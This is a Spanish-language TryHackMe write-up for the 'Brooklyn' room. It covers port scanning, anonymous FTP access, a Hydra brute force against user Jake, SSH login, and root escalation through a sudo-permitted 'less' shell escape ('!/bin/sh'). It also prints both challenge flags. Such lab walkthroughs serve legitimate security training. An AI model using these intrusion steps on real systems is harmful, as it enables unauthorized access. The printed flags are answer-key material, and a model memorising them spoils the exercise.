# Writeup Brooklyn - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | 10.130.176.27 |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---


## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Lo primero que vamos a hacer, es un escaneo inicial de puertos, para saber que tenemos entre nuestras manos:


```bash
sudo nmap -sC -sV -Pn -sS -p- 10.130.176.27 -oN scan_brooklyn.txt
```
```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29
```
Podemos ver que tenemos abierto el puerto 21 (FTP), el 22 (SSH) y el 80 (HTTP). Vamos a empezar por el puerto 21, ya que es un servicio que a veces tiene vulnerabilidades.

---

## Enumeración

Hemos entrado al servicio FTP y ya se ha encontrado la primera vulnerabilidad, se puede acceder de forma anónima. Vamos a buscar si hay archivos que nos puedan dar alguna pista.

![ftp](/imgBrooklyn/image4.png)

Se localiza una nota dirigida a un usuario llamado "Jake". Antes de proceder con un ataque de fuerza bruta mediante Hydra, realizaremos una enumeración de directorios con `gobuster` para ampliar la superficie de ataque.

```text
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.130.176.27
```

Dado que la enumeración de directorios no arroja resultados inmediatos, procedemos a inspeccionar la aplicación web. Al examinar el código fuente, se identifica una referencia a la esteganografía, lo que sugiere que la imagen del sitio web podría contener datos ocultos.

![imagenbrooklyn](/imgBrooklyn/image.png)



## Explotación

Vale, al intentar extraer la posible información de la imagen, da error la herramienta que los datos están corruptos, por lo que es una falsa pista, así que vamos a intentar Hydra para sacar la contraseña del usuario Jake.

![errorsteghide](/imgBrooklyn/image2.png)


![hydra](/imgBrooklyn/image5.png)

¡Exito! Hemos conseguido la contraseña del usuario Jake, por lo que podemos ya acceder como usuario a la máquina.

```bash
ssh jake@10.130.176.27
```

Y la flag de user se encuentra en la carpeta del usuario Holt de la máquina.

```bash
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt 
ee11cbb19052e40b07aac0ca060c23ee
```
---

## Escalada de Privilegios

Ahora, que tenemos acceso a la máquina, vamos a buscar una forma de escalar privilegios para poder acceder a la flag de root.

Lo primero que me llama la atención es un archivo llamado nano.save, por lo que le echaremos un vistazo para ver que contiene y si podemos modificarlo para obtener una shell como root.

```bash
cat nano.save 
cat: nano.save: Permission denied
```

Vale, no tenemos permisos para ver el contenido del archivo, por lo que usaremos el clásico comando `sudo -l` para ver que podemos ejecutar como root.

![sudo](/imgBrooklyn/image6.png)

Curioso. Podemos ejecutar /usr/bin/less sin necesidad de contraseña, por lo que vamos a usar la herramienta "gtfobins" para saber que comando podemos utilizar para aprovechar esta vulnerabilidad.

![gtfobins](/imgBrooklyn/image3.png)

```bash
sudo less /etc/hosts
!/bin/sh
```

¡Hemos conseguido una shell como root! Ya podremos acceder a la flag del root sin problema.

```bash
# whoami
root
# cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845
Enjoy!!
```

---

## Flags

- **User Flag**: ee11cbb19052e40b07aac0ca060c23ee
- **Root Flag**: 63a9f0ea7bb98050796b649e85481845
